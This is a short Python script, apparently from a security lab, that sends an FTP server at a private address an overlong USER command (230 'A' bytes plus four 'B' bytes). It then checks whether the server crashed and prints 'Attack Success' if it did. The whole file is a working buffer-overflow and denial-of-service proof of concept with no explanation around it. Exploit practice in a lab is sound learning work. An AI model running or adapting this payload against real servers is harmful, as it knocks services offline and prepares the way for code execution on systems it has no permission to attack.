# coding=utf-8
"""
DATE:   2021/12/7
AUTHOR: TesterCC
"""

import socket
import time

s = socket.socket()
# 设置连接超时
s.settimeout(3)

connect = s.connect(('172.16.12.129', 21))

buff=b"\x41"*230+b"\x42"*4
data=b"USER "+buff+b"\r\n"

s.send(data)

time.sleep(1)

try:
    s.connect(('172.16.12.129', 21))
    print("[x] Attack Fail")
except:
    print("[+] Attack Success")




if __name__ == '__main__':
    pass
